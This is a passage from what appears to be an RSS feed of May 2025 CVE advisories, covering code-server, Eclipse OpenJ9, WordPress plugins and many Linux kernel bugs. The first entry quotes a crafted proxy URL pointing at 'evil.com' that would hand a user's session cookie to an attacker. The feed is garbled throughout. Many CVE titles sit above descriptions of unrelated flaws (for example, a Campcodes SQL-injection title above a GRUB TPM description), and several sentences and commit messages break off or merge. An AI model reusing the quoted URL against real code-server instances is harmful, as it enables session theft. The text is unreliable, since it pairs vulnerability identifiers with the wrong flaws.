Prior to version 4.99.4, a maliciously crafted URL using the proxy subpath can result in the attacker gaining access to the session token. Failure to properly validate the port for a proxy request can result in proxying to an arbitrary domain. The malicious URL `https:///proxy/test@evil.com/path` would be proxied to `test@evil.com/path` where the attacker could exfiltrate a user's session token. Any user who runs code-server with the built-in proxy enabled and clicks on maliciously crafted links that go to their code-server instances with reference to /proxy. Normally this is used to proxy local ports, however the URL can reference the attacker's domain instead, and the connection is then proxied to that domain, which will include sending cookies. With access to the session cookie, the attacker can then log into code-server and have full access to the machine hosting code-server as the user running code-server. This issue has been patched in version 4.99.4.</description><pubDate>Fri, 09 May 2025 21:17:44 +0000</pubDate></item><item><title>CVE-2025-4447 | Buffer Overflow in Eclipse OpenJ9</title><link>https://www.cve.org/CVERecord?id=CVE-2025-4447</link><description>In Eclipse OpenJ9 versions up to 0.51, when used with OpenJDK version 8 a stack based buffer overflow can be caused by modifying a file on disk that is read when the JVM starts.</description><pubDate>Fri, 09 May 2025 20:45:37 +0000</pubDate></item><item><title>CVE-2025-4489 | Campcodes Online Food Ordering System user-router.php sql injection</title><link>https://www.cve.org/CVERecord?id=CVE-2025-4489</link><description>A vulnerability was found in Campcodes Online Food Ordering System 1.0.

When GRUB is set to automatically decrypt disks using keys stored in the TPM, it reads the decryption key into system memory. If an attacker with physical access can corrupt the underlying filesystem superblock, GRUB will fail to locate a valid filesystem and enter rescue mode. At this point, the disk is already decrypted, and the decryption key remains loaded in system memory. This scenario may allow an attacker with physical access to access the unencrypted data without any further authentication, thereby compromising data confidentiality. Furthermore, the ability to force this state through filesystem corruption also presents a data integrity concern.</description><pubDate>Fri, 09 May 2025 12:24:41 +0000</pubDate></item><item><title>CVE-2025-1087 | Arbitrary Code Execution in Kong Insomnia Desktop Application</title><link>https://www.cve.org/CVERecord?id=CVE-2025-1087</link><description>Kong Insomnia Desktop Application before 11.0.2 contains a template injection vulnerability that allows attackers to execute arbitrary code.

There are a number of issues in Apache Commons Configuration 1.x that allow excessive resource consumption when loading untrusted configurations or using unexpected usage patterns. The Apache Commons Configuration team does not intend to fix these issues in 1.x. Apache Commons Configuration 1.x is still safe to use in scenario's where you only load trusted configurations. 


Users that load untrusted configurations or give attackers control over usage patterns are recommended to upgrade to the 2.x version line, which fixes these issues. Apache Commons Configuration 2.x is not a drop-in replacement, but as it uses a separate Maven groupId and Java package namespace they can be loaded side-by-side, making it possible to do a gradual migration.</description><pubDate>Fri, 09 May 2025 09:44:03 +0000</pubDate></item><item><title>CVE-2025-3949 | Website Builder by SeedProd — Theme Builder, Landing Page Builder, Coming Soon Page, Maintenance Mode &amp;lt;= 6.18.15 - Missing Authorization to Authenticated (Subscriber+) Sensitive Information Exposure</title><link>https://www.cve.org/CVERecord?id=CVE-2025-3949</link><description>The Website Builder by SeedProd — Theme Builder, Landing Page Builder, Coming Soon Page, Maintenance Mode plugin for WordPress is vulnerable to unauthorized access of data due to a missing capability check on the 'seedprod_lite_get_revisisons' function in all versions up to, and including, 6.18.15.

This is caused by the following error path in netfs_init():

Fix this by adding ifdef in netfs_main(), so that /proc/fs/netfs is only

iommu: Clear iommu-dma ops on cleanup

If iommu_device_register() encounters an error, it can end up tearing
down already-configured groups and default domains, however this
currently still leaves devices hooked up to iommu-dma (and even
historically the behaviour in this area was at best inconsistent across
architectures/drivers...) Although in the case that an IOMMU is present
whose driver has failed to probe, users cannot necessarily expect DMA to
work anyway, it's still arguable that we should do our best to put

perf/core: Fix WARN_ON(!ctx) in __free_event() for partial init

Move the get_ctx(child_ctx) call and the child_event-&gt;ctx assignment to
occur immediately after the child event is allocated. Ensure that
child_event-&gt;ctx is non-NULL before any subsequent error path within
inherit_event calls free_event(), satisfying the assumptions of the
cleanup code.

Details:

There's no clear Fixes tag, because this bug is a side-effect of
multiple interacting commits over time (up to 15 years old), not
a single regression.

The code initially incremented refcount then assigned context
immediately after the child_event was created. Later, an early
validity check for child_event was added before the
refcount/assignment. Even later, a WARN_ON_ONCE() cleanup check was
added, assuming event-&gt;ctx is valid if the pmu_ctx is valid.
The problem is that the WARN_ON_ONCE() could trigger after the initial
check passed but before child_event-&gt;ctx was assigned, violating its
precondition. The solution is to assign child_event-&gt;ctx right after
its initial validation. This ensures the context exists for any
subsequent checks or cleanup routines, resolving the WARN_ON_ONCE().

To resolve it, defer the refcount update and child_event-&gt;ctx assignment
directly after child_event-&gt;pmu_ctx is set but before checking if the
parent event is orphaned. The cleanup routine depends on
event-&gt;pmu_ctx being non-NULL before it verifies event-&gt;ctx is
non-NULL. This also maintains the author's original intent of passing
in child_ctx to find_get_pmu_context before its refcount/assignment.

Make variables unsigned to avoid this problem.

sched_yield by a userspace may not actually cause scheduling in

be a badly implemented userspace spinlock in ASAN. Unfortunately, with
time-travel it causes an extreme slowdown or even deadlock depending on
the kernel configuration (CONFIG_UML_MAX_USERSPACE_ITERATIONS).

usb: xhci: Fix isochronous Ring Underrun/Overrun event handling

The TRB pointer of these events points at enqueue at the time of error
occurrence on xHCI 1.1+ HCs or it's NULL on older ones. By the time we
are handling the event, a new TD may be queued at this ring position.

I can trigger this race by rising interrupt moderation to increase IRQ
handling delay. Similar delay may occur naturally due to system load.

If this ever happens after a Missed Service Error, missed TDs will be
skipped and the new TD processed as if it matched the event. It could
be given back prematurely, risking data loss or buffer UAF by the xHC.

Don't complete TDs on xrun events and don't warn if queued TDs don't
match the event's TRB pointer, which can be NULL or a link/no-op TRB.
Don't warn if there are no queued TDs at all.

Now that it's safe, also handle xrun events if the skip flag is clear.
This ensures completion of any TD stuck in 'error mid TD' state right
before the xrun event, which could happen if a driver submits a finite
number of URBs to a buggy HC and then an error occurs on the last TD.</description><pubDate>Fri, 09 May 2025 06:55:23 +0000</pubDate></item><item><title>CVE-2025-37883 | s390/sclp: Add check for get_zeroed_page()</title><link>https://www.cve.org/CVERecord?id=CVE-2025-37883</link><description>In the Linux kernel, the following vulnerability has been resolved:

Restore an IRTE back to host control (remapped or posted MSI mode) if the

the GSI routing type.  Updating the IRTE if and only if the new GSI is an
MSI results in KVM leaving an IRTE posting to a vCPU.

The dangling IRTE can result in interrupts being incorrectly delivered to
the guest, and in the worst case scenario can result in use-after-free,
e.g. if the VM is torn down, but the underlying host IRQ isn't freed.</description><pubDate>Fri, 09 May 2025 06:55:24 +0000</pubDate></item><item><title>CVE-2025-37886 | pds_core: make wait_context part of q_info</title><link>https://www.cve.org/CVERecord?id=CVE-2025-37886</link><description>In the Linux kernel, the following vulnerability has been resolved:

Make the wait_context a full part of the q_info struct rather

loop has given up.

There was a case where a slow development firmware caused
the adminq request to time out, but then later the FW finally
finished the request and sent the interrupt.  The handler tried
to complete_all() the completion context that had been created
on the stack in pdsc_adminq_post() but no longer existed.
This caused bad pointer usage, kernel crashes, and much wailing

pds_core: handle unsupported PDS_CORE_CMD_FW_CONTROL result

If the FW doesn't support the PDS_CORE_CMD_FW_CONTROL command
the driver might at the least print garbage and at the worst
crash when the user runs the "devlink dev info" devlink command.

This happens because the stack variable fw_list is not 0
initialized which results in fw_list.num_fw_slots being a
garbage value from the stack.  Then the driver tries to access
fw_list.fw_names[i] with i &gt;= ARRAY_SIZE and runs off the end
of the array.

Fix this by initializing the fw_list and by not failing
completely if the devcmd fails because other useful information
is printed via devlink dev info even if the devcmd fails.</description><pubDate>Fri, 09 May 2025 06:55:25 +0000</pubDate></item><item><title>CVE-2025-37888 | net/mlx5: Fix null-ptr-deref in mlx5_create_{inner_,}ttc_table()</title><link>https://www.cve.org/CVERecord?id=CVE-2025-37888</link><description>In the Linux kernel, the following vulnerability has been resolved:

smb: client: Fix netns refcount imbalance causing leaks and use-after-free

Commit ef7134c7fc48 ("smb: client: Fix use-after-free of network
namespace.") attempted to fix a netns use-after-free issue by manually
adjusting reference counts via sk-&gt;sk_net_refcnt and sock_inuse_add().

However, a later commit e9f2517a3e18 ("smb: client: fix TCP timers deadlock
after rmmod") pointed out that the approach of manually setting
sk-&gt;sk_net_refcnt in the first commit was technically incorrect, as
sk-&gt;sk_net_refcnt should only be set for user sockets. It led to issues
like TCP timers not being cleared properly on close. The second commit
moved to a model of just holding an extra netns reference for
server-&gt;ssocket using get_net(), and dropping it when the server is torn
down.

But there remain some gaps in the get_net()/put_net() balancing added by
these commits. The incomplete reference handling in these fixes results
in two issues:

1. Netns refcount leaks[1]

The problem process is as follows:

```
mount.cifs                        cifsd

cifs_do_mount
  cifs_mount
    cifs_mount_get_session
      cifs_get_tcp_session

          generic_ip_connect /* Try port 445 */
            get_net()
            -&gt;connect() /* Failed */
            put_net()
          generic_ip_connect /* Try port 139 */
            get_net() /* Missing matching put_net() for this get_net().*/
      cifs_get_smb_ses
        cifs_negotiate_protocol
          smb2_negotiate
            SMB2_negotiate
              cifs_send_recv
                wait_for_response
                                 cifs_demultiplex_thread
                                   cifs_read_from_socket
                                     cifs_readv_from_socket
                                       cifs_reconnect
                                         cifs_abort_connection
                                           sock_release();
                                           server-&gt;ssocket = NULL;
                                           /* Missing put_net() here. */
                                           generic_ip_connect
                                             get_net()
                                             -&gt;connect() /* Failed */
                                             put_net()
                                             sock_release();
                                             server-&gt;ssocket = NULL;
          free_rsp_buf
    ...
                                   clean_demultiplex_info
                                     /* It's only called once here. */
                                     put_net()
```

When cifs_reconnect() is triggered, the server-&gt;ssocket is released
without a corresponding put_net() for the reference acquired in
generic_ip_connect() before. it ends up calling generic_ip_connect()
again to retry get_net(). After that, server-&gt;ssocket is set to NULL
in the error path of generic_ip_connect(), and the net count cannot be
released in the final clean_demultiplex_info() function.

2. Potential use-after-free

The current refcounting scheme can lead to a potential use-after-free issue
in the following scenario:

```
 cifs_do_mount
   cifs_mount
     cifs_mount_get_session
       cifs_get_tcp_session
         get_net()  /* First get net */
           ip_connect
             generic_ip_connect
               get_net()
               bind_socket
	         kernel_bind /* failed */
               put_net()
         /* after out_err_crypto_release label */
         put_net()
         /* after out_err label */
         put_net()
```

In the exception handling process where binding the socket fails, the
get_net() and put_net() calls are unbalanced, which may cause the
server-&gt;net reference count to drop to zero and be prematurely released.

To address both issues, this patch ties the netns reference counti

https://lore.kernel.org/linux-iommu/20250407174408.GB1722458@nvidia.com/

In fact, tegra241_cmdqv_init_structures() only allocates memory resources
which means any failure that it generates would be similar to -ENOMEM, so
there is no point in having that "falling back to standard SMMU" routine,
as the standard SMMU would likely fail to allocate memory too.

Remove the unwind part in tegra241_cmdqv_init_structures(), and return a
proper error code to ask SMMU driver to call tegra241_cmdqv_remove() via
impl_ops-&gt;device_remove(). Then, drop tegra241_vintf_free_lvcmdq() since
devres will take care of that.</description><pubDate>Fri, 09 May 2025 06:55:28 +0000</pubDate></item><item><title>CVE-2025-37839 | jbd2: remove wrong sb-&amp;gt;s_sequence check</title><link>https://www.cve.org/CVERecord?id=CVE-2025-37839</link><description>In the Linux kernel, the following vulnerability has been resolved:

PCI: pciehp: Avoid unnecessary device replacement check

Hot-removal of nested PCI hotplug ports suffers from a long-standing race
condition which can lead to a deadlock:  A parent hotplug port acquires
pci_lock_rescan_remove(), then waits for pciehp to unbind from a child
hotplug port.  Meanwhile that child hotplug port tries to acquire
pci_lock_rescan_remove() as well in order to remove its own children.

The deadlock only occurs if the parent acquires pci_lock_rescan_remove()
first, not if the child happens to acquire it first.

Several workarounds to avoid the issue have been proposed and discarded
over the years, e.g.:

https://lore.kernel.org/r/4c882e25194ba8282b78fe963fec8faae7cf23eb.1529173804.git.lukas@wunner.de/

A proper fix is being worked on, but needs more time as it is nontrivial
and necessarily intrusive.

Recent commit 9d573d19547b ("PCI: pciehp: Detect device replacement during
system sleep") provokes more frequent occurrence of the deadlock when
removing more than one Thunderbolt device during system sleep.  The commit
sought to detect device replacement, but also triggered on device removal.
Differentiating reliably between replacement and removal is impossible
because pci_get_dsn() returns 0 both if the device was removed, as well as
if it was replaced with one lacking a Device Serial Number.

Avoid the more frequent occurrence of the deadlock by checking whether the
hotplug port itself was hot-removed.  If so, there's no sense in checking
whether its child device was replaced.

This works because the -&gt;resume_noirq() callback is invoked in top-down
order for the entire hierarchy:  A parent hotplug port detecting device
replacement (or removal) marks all children as removed using
pci_dev_set_disconnected() and a child hotplug port can then reliably
detect being removed.</description><pubDate>Fri, 09 May 2025 06:55:31 +0000</pubDate></item><item><title>CVE-2025-37844 | cifs: avoid NULL pointer dereference in dbg call</title><link>https://www.cve.org/CVERecord?id=CVE-2025-37844</link><description>In the Linux kernel, the following vulnerability has been resolved:

btrfs: harden block_group::bg_list against list_del() races

As far as I can tell, these calls of list_del_init() on bg_list cannot
run concurrently with btrfs_mark_bg_unused() or btrfs_mark_bg_to_reclaim(),
as they are in transaction error paths and situations where the block
group is readonly.

However, if there is any chance at all of racing with mark_bg_unused(),
or a different future user of bg_list, better to be safe than sorry.

Otherwise we risk the following interleaving (bg_list refcount in parens)

T1 (some random op)                       T2 (btrfs_mark_bg_unused)
                                        !list_empty(&amp;amp;bg-&gt;bg_list); (1)

fs/jfs: Prevent integer overflow in AG size calculation

The JFS filesystem calculates allocation group (AG) size using 1 &lt;&lt;
l2agsize in dbExtendFS(). When l2agsize exceeds 31 (possible with &gt;2TB
aggregates on 32-bit systems), this 32-bit shift operation causes undefined
behavior and improper AG sizing.

On 32-bit architectures:
- Left-shifting 1 by 32+ bits results in 0 due to integer overflow
- This creates invalid AG sizes (0 or garbage values) in
sbi-&gt;bmap-&gt;db_agsize
- Subsequent block allocations would reference invalid AG structures
- Could lead to:
  - Filesystem corruption during extend operations
  - Kernel crashes due to invalid memory accesses
  - Security vulnerabilities via malformed on-disk structures

Fix by casting to s64 before shifting:
bmp-&gt;db_agsize = (s64)1 &lt;&lt; l2agsize;

This ensures 64-bit arithmetic even on 32-bit architectures. The cast
matches the data type of db_agsize (s64) and follows similar patterns in
JFS block calculation code.

scsi: mpi3mr: Synchronous access b/w reset and tm thread for reply queue

When the task management thread processes reply queues while the reset
thread resets them, the task management thread accesses an invalid queue ID
(0xFFFF), set by the reset thread, which points to unallocated memory,
causing a crash.

Add flag 'io_admin_reset_sync' to synchronize access between the reset,
I/O, and admin threads. Before a reset, the reset handler sets this flag to
block I/O and admin processing threads. If any thread bypasses the initial
check, the reset thread waits up to 10 seconds for processing to finish. If
the wait exceeds 10 seconds, the controller is marked as unrecoverable.</description><pubDate>Fri, 09 May 2025 06:55:38 +0000</pubDate></item><item><title>CVE-2025-37862 | HID: pidff: Fix null pointer dereference in pidff_find_fields</title><link>https://www.cve.org/CVERecord?id=CVE-2025-37862</link><description>In the Linux kernel, the following vulnerability has been resolved:

net: dsa: clean up FDB, MDB, VLAN entries on unbind

As explained in many places such as commit b117e1e8a86d ("net: dsa:
delete dsa_legacy_fdb_add and dsa_legacy_fdb_del"), DSA is written given
the assumption that higher layers have balanced additions/deletions.
As such, it only makes sense to be extremely vocal when those
assumptions are violated and the driver unbinds with entries still
present.

But Ido Schimmel points out a very simple situation where that is wrong:
https://lore.kernel.org/netdev/ZDazSM5UsPPjQuKr@shredder/
(also briefly discussed by me in the aforementioned commit).

Basically, while the bridge bypass operations are not something that DSA
explicitly documents, and for the majority of DSA drivers this API
simply causes them to go to promiscuous mode, that isn't the case for
all drivers. Some have the necessary requirements for bridge bypass
operations to do something useful - see dsa_switch_supports_uc_filtering().

Although in tools/testing/selftests/net/forwarding/local_termination.sh,
we made an effort to popularize better mechanisms to manage address
filters on DSA interfaces from user space - namely macvlan for unicast,
and setsockopt(IP_ADD_MEMBERSHIP) - through mtools - for multicast, the
fact is that 'bridge fdb add ... self static local' also exists as
kernel UAPI, and might be useful to someone, even if only for a quick
hack.

It seems counter-productive to block that path by implementing shim
.ndo_fdb_add and .ndo_fdb_del operations which just return -EOPNOTSUPP
in order to prevent the ndo_dflt_fdb_add() and ndo_dflt_fdb_del() from
running, although we could do that.

Accepting that cleanup is necessary seems to be the only option.
Especially since we appear to be coming back at this from a different
angle as well. Russell King is noticing that the WARN_ON() triggers even
for VLANs:
https://lore.kernel.org/netdev/Z_li8Bj8bD4-BYKQ@shell.armlinux.org.uk/

What happens in the bug report above is that dsa_port_do_vlan_del() fails,
then the VLAN entry lingers on, and then we warn on unbind and leak it.

This is not a straight revert of the blamed commit, but we now add an
informational print to the kernel log (to still have a way to see
that bugs exist), and some extra comments gathered from past years'
experience, to justify the logic.</description><pubDate>Fri, 09 May 2025 06:55:39 +0000</pubDate></item><item><title>CVE-2025-37865 | net: dsa: mv88e6xxx: fix -ENOENT when deleting VLANs and MST is unsupported</title><link>https://www.cve.org/CVERecord?id=CVE-2025-37865</link><description>In the Linux kernel, the following vulnerability has been resolved:

net: dsa: mv88e6xxx: fix -ENOENT when deleting VLANs and MST is unsupported

Russell King reports that on the ZII dev rev B, deleting a bridge VLAN
from a user port fails with -ENOENT:
https://lore.kernel.org/netdev/Z_lQXNP0s5-IiJzd@shell.armlinux.org.uk/

This comes from mv88e6xxx_port_vlan_leave() -&gt; mv88e6xxx_mst_put(),
which tries to find an MST entry in &amp;amp;chip-&gt;msts associated with the SID,
but fails and returns -ENOENT as such.

But we know that this chip does not support MST at all, so that is not
surprising. The question is why does the guard in mv88e6xxx_mst_put()
not exit early:

	if (!sid)
		return 0;

And the answer seems to be simple: the sid comes from vlan.sid which
supposedly was previously populated by mv88e6xxx_vtu_get().
But some chip-&gt;info-&gt;ops-&gt;vtu_getnext() implementations do not populate
vlan.sid, for example see mv88e6185_g1_vtu_getnext(). In that case,
later in mv88e6xxx_port_vlan_leave() we are using a garbage sid which is
just residual stack memory.

Testing for sid == 0 covers all cases of a non-bridge VLAN or a bridge
VLAN mapped to the default MSTI. For some chips, SID 0 is valid and
installed by mv88e6xxx_stu_setup(). A chip which does not support the
STU would implicitly only support mapping all VLANs to the default MSTI,
so although SID 0 is not valid, it would be sufficient, if we were to
zero-initialize the vlan structure, to fix the bug, due to the
coincidence that a test for vlan.sid == 0 already exists and leads to
the same (correct) behavior.

Another option which would be sufficient would be to add a test for
mv88e6xxx_has_stu() inside mv88e6xxx_mst_put(), symmetric to the one
which already exists in mv88e6xxx_mst_get(). But that placement means
the caller will have to dereference vlan.sid, which means it will access
uninitialized memory, which is not nice even if it ignores it later.

So we end up making both modifications, in order to not rely just on the
sid == 0 coincidence, but also to avoid having uninitialized structure
fields which might get temporarily accessed.</description><pubDate>Fri, 09 May 2025 06:55:39 +0000</pubDate></item><item><title>CVE-2025-37866 | mlxbf-bootctl: use sysfs_emit_at() in secure_boot_fuse_state_show()</title><link>https://www.cve.org/CVERecord?id=CVE-2025-37866</link><description>In the Linux kernel, the following vulnerability has been resolved:

drm/xe/userptr: fix notifier vs folio deadlock

User is reporting what smells like notifier vs folio deadlock, where
migrate_pages_batch() on core kernel side is holding folio lock(s) and
then interacting with the mappings of it, however those mappings are
tied to some userptr, which means calling into the notifier callback and
grabbing the notifier lock. With perfect timing it looks possible that
the pages we pulled from the hmm fault can get sniped by
migrate_pages_batch() at the same time that we are holding the notifier
lock to mark the pages as accessed/dirty, but at this point we also want
to grab the folio locks(s) to mark them as dirty, but if they are
contended from notifier/migrate_pages_batch side then we deadlock since
folio lock won't be dropped until we drop the notifier lock.

Fortunately the mark_page_accessed/dirty is not really needed in the
first place it seems and should have already been done by hmm fault, so
just remove it.

[Why]
When link training fails, the phy clock will be disabled. However, in

mux selects the phy clock, causing a hang when a register write is made.

When enable_stream is hit, check if link training failed. If it did, fall

nfsd: decrease sc_count directly if fail to queue dl_recall

A deadlock warning occurred when invoking nfs4_put_stid following a failed
dl_recall queue operation:
            T1                            T2

                                  nfs4_anylock_blockers

                                   spin_lock // clp-&gt;cl_lock
                                   nfs4_lockowner_has_blockers
                                    locks_owner_has_blockers

 nfsd_break_deleg_cb
  nfsd_break_one_deleg
   nfs4_put_stid
    refcount_dec_and_lock
     spin_lock // clp-&gt;cl_lock

When a file is opened, an nfs4_delegation is allocated with sc_count
initialized to 1, and the file_lease holds a reference to the delegation.
The file_lease is then associated with the file through kernel_setlease.

The disassociation is performed in nfsd4_delegreturn via the following
call chain:
nfsd4_delegreturn --&gt; destroy_delegation --&gt; destroy_unhashed_deleg --&gt;
nfs4_unlock_deleg_lease --&gt; kernel_setlease --&gt; generic_delete_lease
The corresponding sc_count reference will be released after this
disassociation.

Since nfsd_break_one_deleg executes while holding the flc_lock, the
disassociation process becomes blocked when attempting to acquire flc_lock
in generic_delete_lease. This means:
1) sc_count in nfsd_break_one_deleg will not be decremented to 0;
2) The nfs4_put_stid called by nfsd_break_one_deleg will not attempt to
acquire cl_lock;
3) Consequently, no deadlock condition is created.

Given that sc_count in nfsd_break_one_deleg remains non-zero, we can
safely perform refcount_dec on sc_count directly. This approach
effectively avoids triggering deadlock warnings.</description><pubDate>Fri, 09 May 2025 06:55:42 +0000</pubDate></item><item><title>CVE-2025-37872 | net: txgbe: fix memory leak in txgbe_probe() error path</title><link>https://www.cve.org/CVERecord?id=CVE-2025-37872</link><description>In the Linux kernel, the following vulnerability has been resolved:

igc: fix PTM cycle trigger logic

Writing to clear the PTM status 'valid' bit while the PTM cycle is
triggered results in unreliable PTM operation. To fix this, clear the
PTM 'trigger' and status after each PTM transaction.

The issue can be reproduced with the following:

$ sudo phc2sys -R 1000 -O 0 -i tsn0 -m

Note: 1000 Hz (-R 1000) is unrealistically large, but provides a way to
quickly reproduce the issue.

PHC2SYS exits with:

"ioctl PTP_OFFSET_PRECISE: Connection timed out" when the PTM transaction
  fails

This patch also fixes a hang in igc_probe() when loading the igc
driver in the kdump kernel on systems supporting PTM.

The igc driver running in the base kernel enables PTM trigger in
igc_probe().  Therefore the driver is always in PTM trigger mode,
except in brief periods when manually triggering a PTM cycle.

When a crash occurs, the NIC is reset while PTM trigger is enabled.
Due to a hardware problem, the NIC is subsequently in a bad busmaster
state and doesn't handle register reads/writes.  When running
igc_probe() in the kdump kernel, the first register access to a NIC
register hangs driver probing and ultimately breaks kdump.

With this patch, igc has PTM trigger disabled most of the time,
and the trigger is only enabled for very brief (10 - 100 us) periods
when manually triggering a PTM cycle.  Chances that a crash occurs
during a PTM trigger are not 0, but extremely reduced.</description><pubDate>Fri, 09 May 2025 06:55:44 +0000</pubDate></item><item><title>CVE-2025-3455 | 1 Click WordPress Migration Plugin – 100% FREE for a limited time &amp;lt;= 2.2 - Missing Authorization to Authenticated (Subscriber+) Arbitrary File Upload</title><link>https://www.cve.org/CVERecord?id=CVE-2025-3455</link><description>The 1 Click WordPress Migration Plugin – 100% FREE for a limited time plugin for WordPress is vulnerable to unauthorized modification of data due to a missing capability check on the 'start_restore' function in all versions up to, and including, 2.2.
